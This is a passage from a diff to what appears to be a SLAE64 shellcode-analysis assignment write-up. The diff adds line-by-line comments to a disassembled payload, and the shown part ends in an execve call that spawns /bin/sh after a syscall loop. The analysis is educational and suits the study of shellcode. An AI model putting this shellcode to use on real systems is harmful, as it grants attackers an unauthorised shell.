@@ -183,17 +183,17 @@ whitecr0wz@SLAE64:~/assembly/assignments/Assignment_5/dissect2$ echo -ne "\x6A\x
 00000038  58                pop rax                           ; Pops this value into RAX.
 00000039  0F05              syscall                           ; Executes the syscall.
 0000003B  75F6              jnz 0x33                          ; Jump if the Zero flag (ZF) hasn't been set. This means that until RSI doesn't hit zero (through the dec rsi instruction), the loop will not stop.
-0000003D  6A3B              push byte +0x3b
-0000003F  58                pop rax
-00000040  99                cdq
-00000041  48BB2F62696E2F73  mov rbx,0x68732f6e69622f
+0000003D  6A3B              push byte +0x3b                   ; Pushes syscall value 59 (value of the execve syscall) into the stack.  
+0000003F  58                pop rax                           ; Pops this value into RAX.
+00000040  99                cdq                               ; EDX:EAX ← sign-extend of EAX. Commonly used to clean RDX.
+00000041  48BB2F62696E2F73  mov rbx,0x68732f6e69622f          ; Moves value "/bin/sh" into RBX.
          -6800
-0000004B  53                push rbx
-0000004C  4889E7            mov rdi,rsp
-0000004F  52                push rdx
-00000050  57                push rdi
-00000051  4889E6            mov rsi,rsp
-00000054  0F05              syscall
+0000004B  53                push rbx                          ; Pushes the RBX into the stack.
+0000004C  4889E7            mov rdi,rsp                       ; The value of RSP is copied into RDI.
+0000004F  52                push rdx                          ; RDX is pushed. It is most likely that this is simply a NULL-DWORD.
+00000050  57                push rdi                          ; RDI (/bin/sh) is pushed into the stack.
+00000051  4889E6            mov rsi,rsp                       ; The value of RSP is copied into RSI.
+00000054  0F05              syscall                           ; Executes the syscall.
 ```
 
 ### Code
